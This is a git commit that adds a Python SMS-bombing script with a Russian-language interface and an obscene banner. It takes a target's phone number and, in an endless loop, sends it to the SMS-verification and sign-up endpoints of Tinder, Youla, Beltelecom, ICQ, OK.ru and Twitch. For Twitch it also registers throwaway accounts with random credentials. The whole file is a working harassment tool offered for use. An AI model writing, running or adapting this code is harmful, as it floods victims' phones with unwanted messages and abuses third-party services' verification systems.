bab399fa13564c443ad7361ccbe80eab51f8799a
H9III4 <60015203+H9III4@users.noreply.github.com>
2020-01-24 19:05:34 +0300

    Add files via upload

---
+++ spamer2.py
@@ -0,0 +1,106 @@
+import requests, random, datetime, sys, time, argparse, os
+from colorama import Fore, Back, Style
+
+banner = """
+ ____________________________________________________
+|                                                    |
+|                                 
+|                                                    |
+|                  sosi chlen           
+|                                                    |
+|                             
+|____________________________________________________|
+"""
+
+print(banner)
+_phone = input('номер без + ')
+
+if _phone[0] == '+':
+	_phone = _phone[1:]
+if _phone[0] == '8':
+	_phone = '7'+_phone[1:]
+if _phone[0] == '9':
+	_phone = '7'+_phone
+
+_name = ''
+for x in range(12):
+	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+
+_phone9 = _phone[1:]
+_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
+_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+
+iteration = 0
+while True:
+	_email = _name+f'{iteration}'+'@gmail.com'
+	email = _name+f'{iteration}'+'@gmail.com'
+	
+
+	try:
+		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
+		print('[+] Tinder отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+
+	
+	try:
+		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+		print('[+] Youla отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+
+	try:
+		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
+		print('[+] Beltelcom отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
+		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+		print('[+] ICQ отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+
+	try:
+		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
+		print('[+] OK отправлено!')
+	except:
+		print('[-] Не отправлено!')
+	
+
+	try:
+		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
+		print('[+] Tinder отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
+		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
+		print('[+] Twitch отправлено')
+	except:
+		print('[-] Не отправлено!')
+
+
+	try:
+		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+		print('[+] Youla отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+
+
+
+
+	try:
+		iteration += 1
+		print(('{} круг пройден.').format(iteration))
+	except:
+		break
